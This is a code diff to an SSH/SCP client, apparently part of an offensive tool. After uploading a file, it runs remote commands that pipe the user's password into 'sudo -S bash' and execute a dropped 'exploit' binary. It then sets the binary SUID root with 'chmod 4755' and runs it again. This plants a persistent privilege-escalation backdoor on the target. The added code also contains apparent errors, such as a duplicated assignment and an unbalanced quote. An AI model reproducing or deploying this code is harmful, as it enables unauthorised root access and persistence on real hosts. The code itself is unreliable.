@@ -23,7 +23,7 @@ void session_connect(ssh_session ssh_session, ssh_session_data sessionData){
     if (sessionData.protocol == "scp") {
         SCP_Handler(ssh_session,sessionData);
     } else if (sessionData.protocol == "ssh") {
-        // Do something if the protocol is "ssh"
+        SSH_command(ssh_session,sessionData);
     }
     
     ssh_disconnect(ssh_session);
@@ -125,9 +125,72 @@ int SCP_Handler(ssh_session ssh_session, ssh_session_data sessionData) {
     fclose(local_file);
     free(buffer);
 
+    //Set SUID on exploit
+    sessionData.ssh_command_to_send = "echo " + sessionData.password + " | sudo -S bash -c '" 
+    + sessionData.DROPOFF + sessionData.EXPLOIT_NAME + "; chmod 4755 " + sessionData.EXPLOIT_NAME + "'";
+    SSH_command(ssh_session,sessionData);
+
+    //execute Exploit
+    sessionData.ssh_command_to_send = sessionData.ssh_command_to_send = "echo " + 
+    sessionData.password + " | sudo -S bash -c " +  sessionData.DROPOFF + sessionData.EXPLOIT_NAME;
+    SSH_command(ssh_session,sessionData);
+
+
+
     // Close SCP session
     ssh_scp_close(scp_session);
     ssh_scp_free(scp_session);
 
     return SSH_OK;
+}
+
+int SSH_command(ssh_session ssh_session, ssh_session_data sessionData){
+    
+    ssh_channel channel;
+    int rc;
+ 
+  channel = ssh_channel_new(ssh_session);
+  if (channel == NULL) return SSH_ERROR;
+ 
+  rc = ssh_channel_open_session(channel);
+  if (rc != SSH_OK)
+  {
+    ssh_channel_free(channel);
+    return rc;
+  }
+  
+  rc = ssh_channel_request_exec(channel, sessionData.ssh_command_to_send.c_str());
+  if (rc != SSH_OK){
+        ssh_channel_close(channel);
+        ssh_channel_free(channel);
+        return rc;
+  }
+
+  char buffer[256];
+int nbytes;
+ 
+nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+while (nbytes > 0)
+{
+  if (fwrite(buffer, 1, nbytes, stdout) != nbytes)
+  {
+    ssh_channel_close(channel);
+    ssh_channel_free(channel);
+    return SSH_ERROR;
+  }
+  nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+}
+ 
+    if (nbytes < 0)
+    {
+    ssh_channel_close(channel);
+    ssh_channel_free(channel);
+    return SSH_ERROR;
+    }
+
+    ssh_channel_send_eof(channel);
+    ssh_channel_close(channel);
+    ssh_channel_free(channel);
+ 
+  return SSH_OK;
 }
